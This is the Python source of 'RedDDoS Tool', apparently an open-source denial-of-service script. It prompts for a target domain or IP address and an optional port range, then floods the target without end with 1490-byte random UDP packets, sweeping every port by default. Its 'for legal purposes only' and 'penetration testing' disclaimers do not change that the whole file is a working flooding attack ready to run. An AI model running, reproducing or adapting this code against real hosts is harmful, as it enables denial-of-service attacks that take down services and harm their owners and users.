"""
Copyright (c) 2020-2021 Vladimir Rogozin (vladimir20040609@gmail.com)

Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
or copy at http://opensource.org/licenses/MIT)
"""

from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

version = "1.4"

def clear_screen():
    os.system('cls' if system() == 'Windows' else 'clear')

def display_header():

    clear_screen()
    print(f"\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: {version}")       
    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
    print("                        Author: Mr.\033[91mRed\033[0m")
    print("       Github: https://github.com/Red-company/RDDoS_Tool")
    print('                   For legal purposes only')
    print("\033[92;1m")
    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
    print('\033[0m')

def get_ip_by_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except socket.gaierror:
        logging.error(f"Could not resolve the domain: {domain}")
        return None

def display_about():

    print("RedDDoS Tool is an open-source penetration testing tool.")
    print("Use it to ethically test networks/servers/devices.")
    print("\nThe author of the program is not responsible for misuse. Use only in legal cases.")
    input("\nPress Enter to continue...")

def select_target():

    while True:
        opt = input("\nSelect the option (1, 2, 3 or 4): ").strip()
        if opt == '1':
            domain = input("Enter the domain: ").strip()
            ip = get_ip_by_domain(domain)
            if ip:
                return ip
        elif opt == '2':
            ip = input("Enter the IP address: ").strip()
            return ip
        elif opt == '3':
            display_about()
            display_header()
        elif opt == '4':
            print("Exiting...")
            exit()
        else:
            logging.warning("Invalid choice! Please try again.")

def select_ports():
    while True:
        port_mode = input("Do you want to specify a port or range? [y/n]: ").strip().lower()
        if port_mode == 'y':
            while True:
                try:
                    ports = input("Enter the port or range (e.g., 80 or 100-200): ").strip()
                    if '-' in ports:
                        start_port, end_port = map(int, ports.split('-'))
                        if 2 <= start_port <= 65534 and 2 <= end_port <= 65534 and start_port <= end_port:
                            return range(start_port, end_port + 1)
                        else:
                            print("Invalid port range! Enter values between 2 and 65534.")
                    else:
                        port = int(ports)
                        if 2 <= port <= 65534:
                            return [port]
                        else:
                            print("Invalid port! Enter a value between 2 and 65534.")
                except ValueError:
                    print("Invalid input! Enter a valid number or range.")
        elif port_mode == 'n':
            return None
        else:
            logging.warning("Invalid choice! Please try again.")

def perform_attack(ip, ports=None):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        payload = random._urandom(1490)
        sent = 0

        try:
            while True:
                if ports:
                    for port in ports:
                        sock.sendto(payload, (ip, port))
                        logging.info(f"Sent {sent + 1} packets to {ip} through port: {port}")
                        sent += 1
                else:
                    for current_port in range(1, 65535):
                        sock.sendto(payload, (ip, current_port))
                        logging.info(f"Sent {sent + 1} packets to {ip} through port: {current_port}")
                        sent += 1
        except KeyboardInterrupt:
            logging.info("Attack interrupted by user.")
        except Exception as e:
            logging.error(f"An error occurred: {e}")

def main():
    display_header()
    ip = select_target()
    ports = select_ports()
    clear_screen()
    print("\033[36;2mINITIALIZING....")
    time.sleep(1)
    print("STARTING ATTACK...")
    time.sleep(2)
    perform_attack(ip, ports)

if __name__ == '__main__':
    main()
